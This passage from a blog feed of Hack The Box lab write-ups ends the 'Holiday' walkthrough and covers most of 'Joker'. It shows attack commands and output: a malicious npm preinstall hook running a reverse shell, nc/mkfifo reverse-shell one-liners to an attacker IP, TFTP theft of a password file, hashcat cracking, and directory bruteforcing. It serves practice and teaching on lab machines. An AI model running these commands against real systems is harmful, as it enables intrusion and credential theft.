    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rimraf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rmrf&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;author&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;João Jerónimo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ISC&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So we can adapt this package.json to getting a reverse shell:&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rimrafall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;main&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;preinstall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bash /tmp/shell&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;keywords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rimraf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rmrf&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;author&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;João Jerónimo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ISC&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this index.js&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;module.exports = &quot;npm install could be dangerous.&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~/app$ mkdir rimrafall
algernon@holiday:~/app$ cd rimrafall
algernon@holiday:~/app/rimrafall$
algernon@holiday:~/app/rimrafall$ ls
index.js
package.json
algernon@holiday:~/app/rimrafall$ ls
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then our reverse shell&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.14.27 4445 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~/app/rimrafall$ cd /tmp
algernon@holiday:/tmp$ wget 10.10.14.27:8000/shell
wget 10.10.14.27:8000/shell
--2020-04-27 22:46:05--  http://10.10.14.27:8000/shell
Connecting to 10.10.14.27:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 91 [application/octet-stream]
Saving to: ‘shell’

     0K                                                       100% 17.5M=0s

2020-04-27 22:46:05 (17.5 MB/s) - ‘shell’ saved [91/91] 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~/app$ sudo npm i rimrafall --unsafe

&amp;gt; rimrafall@1.0.0 preinstall /home/algernon/app/node_modules/.staging/rimrafall-aa0a316f
&amp;gt; bash /tmp/shell

rm: cannot remove '/tmp/f': No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; rlwrap nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.25] 52106
/bin/sh: 0: can't access tty; job control turned off
# id &amp;amp;&amp;amp; cat /root/root.txt
uid=0(root) gid=0(root) groups=0(root)
a844cb50bf88ebbe8412e095a6b642e8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;hack-only-for-fun-and-learning-not-for-profit&quot;&gt;Hack only for fun and learning. Not for profit&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday24.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><category term="Holiday" /><category term="SQL Injection" /><category term="XSS Stored" /><category term="Command Injection" /><category term="Sudo npm" /><summary type="html">Holiday was a hard box with a SQL Injection through a post form to retrieve credentials to login. Once gained access, we can stole the admin cookie with an XSS stored in the web page. After that, we can perform command injection through a form, bypassing the regex and obtain the reverse shell on the remote system. For the privesc we have sudo rights with npm to install our malicious json package and getting root shell.</summary></entry><entry><title type="html">Joker - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-joker/" rel="alternate" type="text/html" title="Joker - Hack The Box" /><published>2020-04-25T00:00:00+02:00</published><updated>2020-04-25T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-joker</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-joker/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/jokera.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Joker was a hard box with a Http-Proxy-Squid that allows us through the TFTP to retrieve the username and password. The credentials we retrieve can be used to access the site where, bruteforcing the directories we will find a Python Console. After taking a shell, we will use sudo to create a symlink with our ssh key, to access with the user Alekos. For the privesc we will abuse a crontab which saves archivies as root.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;We can interact with Squid through the proxy retrieving the credentials from TFTP&lt;/li&gt;
  &lt;li&gt;Now we can use those credentials to access the website, discovering a python console&lt;/li&gt;
  &lt;li&gt;Sudo -l allows us to create a symlink with the user Alekos replacing our ssh key in his authorized_keys&lt;/li&gt;
  &lt;li&gt;Using a crontab that copies archives as root, we can insert our reverse shell and become root&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;portscan-tcp&quot;&gt;Portscan TCP&lt;/h2&gt;

&lt;p&gt;We discover on the remote host 2 open TCP ports: 22 SSH and 3128 http-proxy Squid.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sV -sC -O 10.10.10.21
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 21:08 CEST
Nmap scan report for 10.10.10.21
Host is up (0.046s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)
|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)
|_  256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.2 - 4.9 (94%), Linux 4.4 (94%), Linux 4.8 (94%), Linux 4.9 (94%), Linux 3.16 (93%), Linux 3.12 (93%), Linux 3.13 or 4.2 (93%), Linux 3.16 - 4.6 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;what-is-squid&quot;&gt;What is Squid?&lt;/h2&gt;

&lt;p&gt;Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages. Squid has extensive access controls and makes a great server accelerator. It runs on most available operating systems, including Windows and is licensed under the GNU GPL.
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/proxy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;recon---http-proxy-squid&quot;&gt;Recon - HTTP-PROXY SQUID&lt;/h2&gt;

&lt;p&gt;Using the IP address I get an error “The requested URL could not be retrieved” when I try to access the site on port 3128.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Some basic research shows that this is a general purpose proxy, so the best move is probably to route all connections through this proxy and see what’s being served locally on the machine.&lt;/p&gt;

&lt;h2 id=&quot;portscan-udp&quot;&gt;Portscan UDP&lt;/h2&gt;

&lt;p&gt;We discover on the remote host 2 open UDP ports: 69 TFTP and 5355 llmnr.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sU -oA udp 10.10.10.21
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 21:23 CEST
Nmap scan report for 10.10.10.21
Host is up (0.048s latency).
Not shown: 998 closed ports
PORT     STATE         SERVICE
69/udp   open|filtered tftp
5355/udp open|filtered llmnr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;route-with-proxy&quot;&gt;Route with PROXY&lt;/h2&gt;

&lt;p&gt;First we need to set a new proxy route with FoxyProxy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we can connect to ftp://10.10.10.21 using our proxy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We get prompted for a username and password which we don’t still know.&lt;/p&gt;

&lt;h2 id=&quot;what-is-tftp&quot;&gt;What is TFTP?&lt;/h2&gt;

&lt;p&gt;Trivial File Transfer Protocol (TFTP) is a simple lockstep File Transfer Protocol which allows a client to get a file from or put a file onto a remote host. One of its primary uses is in the early stages of nodes booting from a local area network. TFTP has been used for this application because it is very simple to implement.&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/tftp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;looking-into-tftp&quot;&gt;Looking into TFTP&lt;/h2&gt;

&lt;p&gt;According to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;What is TFTP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;What is Squid&lt;/code&gt; we have to look for squid configuration files.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; tftp 10.10.10.21
tftp&amp;gt; get /etc/squid/squid.conf
Received 295428 bytes in 49.2 seconds 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The recovered configuration file is full of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; characters, so we will have to clean it to read the active configurations on squid.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; cat squid.conf | grep -v ^\#|grep .
acl SSL_ports port 443
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp
acl Safe_ports port 443         # https
acl Safe_ports port 70          # gopher
acl Safe_ports port 210         # wais
acl Safe_ports port 1025-65535  # unregistered ports
acl Safe_ports port 280         # http-mgmt
acl Safe_ports port 488         # gss-http
acl Safe_ports port 591         # filemaker
acl Safe_ports port 777         # multiling http
acl CONNECT method CONNECT
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access deny manager
auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
auth_param basic realm kalamari
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern (Release|Packages(.gz)*)$      0       20%     2880
refresh_pattern .               0       20%     4320 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The files reveal an interesting directory: /etc/squid/passwords&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; tftp 10.10.10.21
tftp&amp;gt; get /etc/squid/passwords
Received 48 bytes in 0.1 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; cat passwords 
kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s find out what kind of password it is:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0

Possible Hashs:
[+] MD5(APR)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; hashcat -m 1600 /root/Documenti/joker/joker /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz, 4096/10037 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0:ihateseafood
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
Time.Started.....: Sun Apr 26 00:37:29 2020 (11 mins, 1 sec)
Time.Estimated...: Sun Apr 26 00:48:30 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10927 H/s (11.04ms) @ Accel:256 Loops:250 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 7443968/14344385 (51.89%)
Rejected.........: 0/7443968 (0.00%)
Restore.Point....: 7443456/14344385 (51.89%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidates.#1....: ihateteeha -&amp;gt; ihatenikiga

Started: Sun Apr 26 00:37:05 2020
Stopped: Sun Apr 26 00:48:31 2020
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;get-the-access&quot;&gt;Get the access&lt;/h2&gt;

&lt;p&gt;Let’s add the new credentials found on FoxyProxy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And then let’s connect to our localhost.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now i’m going to bruteforce the web directories to find something interesting.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; dirb http://127.0.0.1 -p 10.10.10.21:3128 -P kalamari:ihateseafood -r

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Apr 26 02:32:58 2020
URL_BASE: http://127.0.0.1/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
PROXY: 10.10.10.21:3128
PROXY AUTHORIZATION: kalamari:ihateseafood
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://127.0.0.1/ ----
+ http://127.0.0.1/console (CODE:200|SIZE:1479)                                                                             
==&amp;gt; DIRECTORY: http://127.0.0.1/list/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/images/htb-writeup-joker/joker7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;code-execution&quot;&gt;Code Execution&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is a single thread python console. This means that if we execute a wrong command, it will hang and make it impossible to execute other commands. However, if you try placing a reverse shell acting over TCP in the console, you won’t get a connection back. A quick peek at the firewall rules reveals all.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; cat base | base64 -d
# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017
*filter
:INPUT DROP [41573:1829596]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [878:221932]
-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
-A INPUT -i ens33 -p udp -j ACCEPT
-A INPUT -i ens33 -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
COMMIT
# Completed on Fri May 19 18:01:16 2017
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;All the TCP connections are dropped except SSH on 22 and Squid on 3128. So we just have to understand what kind of netcat runs on the remote machine before performing a reverse shell on UDP port.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We got OpenBSD netcat so which means we don’t have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt; flag. So, we’ll take our reverse shell on PentestMonkey http://pentestmonkey.net/.
&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nc -u -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.21] 53758
/bin/sh: 0: can't access tty; job control turned off
$ id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; pwd 
uid=1000(werkzeug) gid=1000(werkzeug) groups=1000(werkzeug)
werkzeug
/var/www
$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privesc-to-alekos&quot;&gt;PrivEsc to Alekos&lt;/h2&gt;

&lt;p&gt;First of all let’s spawn a full TTY shell with python:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
$ CTRL + Z
$ stty raw -echo
$ fg
$ ls
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s take a look on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;werkzeug@joker:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
